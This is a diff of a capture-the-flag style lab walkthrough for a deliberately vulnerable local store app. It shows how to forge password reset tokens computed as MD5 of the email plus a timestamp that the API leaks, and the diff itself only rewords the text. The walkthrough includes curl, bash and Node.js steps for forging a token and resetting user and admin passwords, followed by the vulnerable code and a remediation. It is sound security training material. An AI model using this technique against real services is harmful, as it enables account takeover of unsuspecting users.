@@ -13,29 +13,29 @@ tags:
 description: Exploit a predictable password reset token generation mechanism to take over any user account.
 ---
 
-The password reset feature generates tokens using `MD5(email + timestamp)`, where the timestamp is leaked in the API response. This allows an attacker to forge valid reset tokens for any user account.
+The password reset on OopsSec Store builds tokens from `MD5(email + timestamp)`. The timestamp is right there in the API response. You can forge a valid reset token for any account in one request.
 
 ## Table of contents
 
 ## Lab setup
 
-Start the lab using the following command:
+Start the lab:
 
 ```bash
 npx create-oss-store@latest
 ```
 
-Navigate to `http://localhost:3000` and familiarize yourself with the application.
+The app runs at `http://localhost:3000`.
 
 ## Target identification
 
-### Step 1: Discover the password reset feature
+### Step 1: Find the password reset flow
 
-Navigate to the login page at `/login`. Notice the "Forgot password?" link below the password field. Click it to reach `/login/forgot-password`.
+Go to `/login`. There's a "Forgot password?" link below the password field. Click it to reach `/login/forgot-password`.
 
-### Step 2: Analyze the API response
+### Step 2: Watch the API response
 
-Enter your own email (e.g., `alice@example.com`) and submit the form. Open your browser's DevTools Network tab to inspect the response from `POST /api/auth/forgot-password`:
+Enter your own email (e.g., `alice@example.com`) and submit. Open DevTools (Network tab) and look at the response from `POST /api/auth/forgot-password`:
 
 ```json
 {
@@ -44,23 +44,23 @@ Enter your own email (e.g., `alice@example.com`) and submit the form. Open your 
 }
 ```
 
-The `requestedAt` field contains a precise ISO timestamp. This is suspicious. Why would a "check your email" response need to include the exact server time?
+That `requestedAt` field is a precise ISO timestamp. Why would a "check your email" response include the exact server time?
 
 ## Exploitation
 
-### Step 3: Understand the token algorithm
+### Step 3: Figure out the token algorithm
 
-By examining the application or through experimentation, determine that the reset token is generated as:
+Dig into the source or experiment. The reset token is:
 
 ```
 token = MD5(email + Math.floor(Date.now() / 1000))
 ```
 
-The `requestedAt` timestamp reveals the exact second the token was created.
+The `requestedAt` timestamp tells you the exact second the token was created.
 
 ### Step 4: Request a reset for any user
 
-You can target any account. For example, using Alice's account:
+Pick a target. Alice works:
 
 ```bash
 curl -s -X POST http://localhost:3000/api/auth/forgot-password \
@@ -68,11 +68,11 @@ curl -s -X POST http://localhost:3000/api/auth/forgot-password \
   -d '{"email":"alice@example.com"}'
 ```
 
-Note the `requestedAt` value from the response.
+Grab the `requestedAt` value from the response.
 
-### Step 5: Compute the forged token
+### Step 5: Forge the token
 
-Convert the ISO timestamp to a Unix timestamp and compute the MD5 hash:
+Convert the ISO timestamp to Unix seconds and compute the MD5 hash:
 
 ```bash
 # Example: requestedAt = "2026-02-26T10:30:45.123Z"
@@ -81,7 +81,7 @@ TOKEN=$(echo -n "alice@example.com${TIMESTAMP}" | md5sum | cut -d' ' -f1)
 echo $TOKEN
 ```
 
-Or using Node.js:
+Or with Node.js:
 
 ```javascript
 const crypto = require("crypto");
@@ -102,8 +102,6 @@ curl -s -X POST http://localhost:3000/api/auth/reset-password \
   -d "{\"token\":\"${TOKEN}\",\"password\":\"hacked123\"}"
 ```
 
-The response contains the flag:
-
 ```json
 {
   "message": "Your password has been reset successfully.",
@@ -111,18 +109,13 @@ The response contains the flag:
 }
 ```
 
-### Bonus: Admin account takeover
+### Bonus: admin account takeover
 
-For a more impactful demonstration, target the admin account:
-
-1. Request a reset for `admin@oss.com` instead
-2. Forge the token using the same technique
-3. Reset the admin password
-4. Log in at `/login` with the new credentials
+Same technique, different email. Request a reset for `admin@oss.com`, forge the token, reset the password, log in at `/login`.
 
 ## Vulnerable code analysis
 
-The core vulnerability is in the token generation logic:
+The bug is in the token generation at `/app/api/auth/forgot-password/route.ts`:
 
 ```typescript
 // app/api/auth/forgot-password/route.ts
@@ -139,14 +132,11 @@ return NextResponse.json({
 });
 ```
 
-The two inputs to the token — email and timestamp — are both known to the attacker:
-
-- The email is provided by the attacker in the request
-- The timestamp is leaked via the `requestedAt` field in the response
+Both inputs to the hash are known to the attacker. They sent the email in the request. The server hands back the timestamp in the response. That's everything you need.
 
 ## Remediation
 
-Use a cryptographically secure random token generator instead of a deterministic algorithm:
+Generate tokens with `crypto.randomBytes` instead of a deterministic hash:
 
 ```typescript
 import crypto from "crypto";
@@ -154,4 +144,4 @@ import crypto from "crypto";
 const token = crypto.randomBytes(32).toString("hex");
 ```
 
-Remove the `requestedAt` field from the API response, and add rate limiting to prevent abuse.
+Drop the `requestedAt` field from the response, and add rate limiting on the endpoint.
